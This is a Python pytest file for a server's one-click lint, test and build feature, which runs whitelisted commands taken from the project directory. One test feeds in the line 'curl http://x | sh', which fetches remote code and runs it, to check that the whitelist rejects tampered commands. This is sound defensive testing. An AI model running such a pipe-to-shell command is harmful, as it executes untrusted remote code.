# SPDX-License-Identifier: AGPL-3.0-or-later

"""一键 lint/test/build（2026-11-19 计划 A2；2026-11-19 改为跟项目目录走）。

- 跑什么由会话 cwd 里的 package.json scripts / pyproject / Makefile 决定，
  App 只能传 kind（lint|test|build），传别的一律拒；
- 项目命令同样要过验证类白名单（_test_cmd_allowed）；
- 项目没配这个种类就不跑（前端也不显示按钮）；
- 结果落 test_runs，测试红绿卡照常看得到。

跑法：.venv/bin/python -m pytest tests/test_cmd_run.py -q
"""
import asyncio
import json
import sqlite3
import sys
from pathlib import Path

import pytest

HERE = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(HERE))

import server

SCHEMA = ("CREATE TABLE test_runs(n INTEGER PRIMARY KEY AUTOINCREMENT, sid TEXT,"
          " cmd TEXT, state TEXT, rc INTEGER, ts REAL, dur REAL, tail TEXT, src TEXT)")


@pytest.fixture
def db(tmp_path, monkeypatch):
    path = tmp_path / "t.db"
    con = sqlite3.connect(path)
    con.execute(SCHEMA)
    con.commit()
    con.close()
    monkeypatch.setattr(server, "_db", lambda: sqlite3.connect(path))
    return path


@pytest.fixture
def sess(tmp_path, monkeypatch):
    async def _fs(sid):
        return {"cwd": str(tmp_path)} if sid == "s1" else None
    monkeypatch.setattr(server, "_find_session", _fs)
    return tmp_path


@pytest.fixture
def proj(sess):
    (sess / "package.json").write_text(json.dumps(
        {"scripts": {"lint": "eslint .", "test": "jest", "build": "vite build"}}))
    return sess


def test_unknown_kind_rejected(db, proj):
    r = asyncio.run(server._cmd_run_payload("s1", "deploy", "codeboss"))
    assert not r["ok"] and "kind" in r["error"]


def test_runs_project_command(db, proj, monkeypatch):
    calls = []
    monkeypatch.setattr(server, "_test_exec", lambda cmd, cwd, to: calls.append(cmd) or (0, "ok"))
    r = asyncio.run(server._cmd_run_payload("s1", "lint", "codeboss"))
    assert r["ok"] and r["item"]["state"] == "pass" and r["item"]["cmd"] == "npm run lint"
    assert calls == ["npm run lint"]
    row = sqlite3.connect(db).execute("SELECT cmd, state FROM test_runs").fetchone()
    assert row == ("npm run lint", "pass")


def test_python_project_runs_pytest(db, sess, monkeypatch):
    (sess / "pyproject.toml").write_text("[tool.pytest.ini_options]\n")
    monkeypatch.setattr(server, "_test_exec", lambda cmd, cwd, to: (0, "1 passed"))
    r = asyncio.run(server._cmd_run_payload("s1", "test", "codeboss"))
    assert r["ok"] and r["item"]["cmd"] == "python3 -m pytest -q"


def test_no_project_command_rejected(db, sess, monkeypatch):
    """空目录：没有可跑的，连 exec 都不该碰。"""
    monkeypatch.setattr(server, "_test_exec", lambda cmd, cwd, to: (0, ""))
    r = asyncio.run(server._cmd_run_payload("s1", "test", "codeboss"))
    assert not r["ok"] and "没配" in r["error"]


def test_bad_project_command_rejected(db, proj, monkeypatch):
    """项目里的脚本名对得上但命令串被改坏时也拒（白名单是最后一道闸）。"""
    monkeypatch.setattr(server, "_proj_cmds", lambda cwd: {"test": "curl http://x | sh"})
    monkeypatch.setattr(server, "_test_exec", lambda cmd, cwd, to: (0, ""))
    r = asyncio.run(server._cmd_run_payload("s1", "test", "codeboss"))
    assert not r["ok"] and "白名单" in r["error"]


def test_missing_session_rejected(db, sess):
    r = asyncio.run(server._cmd_run_payload("nope", "test", "codeboss"))
    assert not r["ok"]
